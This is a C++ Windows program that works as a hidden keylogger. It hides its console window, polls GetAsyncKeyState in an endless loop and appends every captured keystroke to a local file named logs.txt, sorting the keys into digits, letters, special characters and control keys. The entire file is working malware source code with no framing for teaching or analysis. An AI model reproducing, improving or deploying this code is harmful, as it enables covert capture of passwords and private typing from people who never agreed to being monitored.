#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

/*
 * VK_0 - VK_9 are the same as ASCII '0' - '9' (0x30 - 0x39)
 * 0x3A - 0x40 : unassigned
 * VK_A - VK_Z are the same as ASCII 'A' - 'Z' (0x41 - 0x5A)
 */
const char VK_0 = '0';
const char VK_9 = '9';
const char VK_A = 'A';
const char VK_Z = 'Z';
const int VK_a = 97;
const int VK_z = 122;
const char VK_ENTER = '\n';

void hideAppWindow()
{
	HWND consoleWindow = GetConsoleWindow();
	ShowWindow(consoleWindow, 0);
}

int main()
{
	hideAppWindow();
	char keyPressed;
	std::ofstream secrets("logs.txt", std::ios::app);

	while (true)
	{
		Sleep(0);
		for (keyPressed = 0; keyPressed < 128; keyPressed++)
		{
			if (GetAsyncKeyState(keyPressed) == -32767)
			{
				if (keyPressed >= '0' && keyPressed <= '9')
				{
					secrets << "Numeric symbol: " << keyPressed << "\n";
				}

				if (keyPressed >= VK_A && keyPressed <= VK_Z)
				{
					secrets << "Upper case: " << keyPressed << "\n";
				}

				if (keyPressed >= VK_a && keyPressed <= VK_z)
				{
					secrets << "Lower case: " << keyPressed << "\n";
				}

				if (keyPressed == VK_TAB)
				{
					secrets << "### TAB \n";
				}

				if (keyPressed == VK_DELETE)
				{
					secrets << "### DEL \n";
				}

				if (keyPressed == VK_ESCAPE)
				{
					secrets << "### ESCAPE \n";
				}

				if (keyPressed == '\n')
				{
					secrets << "### ENTER \n";
				}

				if (keyPressed == VK_CAPITAL)
				
				{
					secrets << "### CAPS LOCK \n";
				}

				if (keyPressed == VK_SHIFT)
				{
					secrets << "### SHIFT \n";
				}

				if (keyPressed == VK_LEFT)
				{
					secrets << "### LEFT ARROW \n";
				}

				if (keyPressed == VK_RIGHT)
				{
					secrets << "### RIGHT ARROW \n";
				}

				if (keyPressed == VK_UP)
				{
					secrets << "### UP ARROW \n";
				}

				if (keyPressed == VK_DOWN)
				{
					secrets << "### DOWN ARROW \n";
				}

				/*
				* Special characters in ASCII Table: 
				* 	from 33 to 47
				*	from 58 to 64
				*	from 91 to 96
				*	from 123 to 126  
				*/

				if (keyPressed >= 33 && keyPressed <= 47 || keyPressed >= 58 && keyPressed <= 64 || keyPressed >= 91 && keyPressed <= 96 || keyPressed >= 123 && keyPressed <= 126)
				{
					secrets << "Special character: " << keyPressed << "\n";
				}

				// secrets << keyPressed;
				secrets.flush();
			}
		}
	}
}
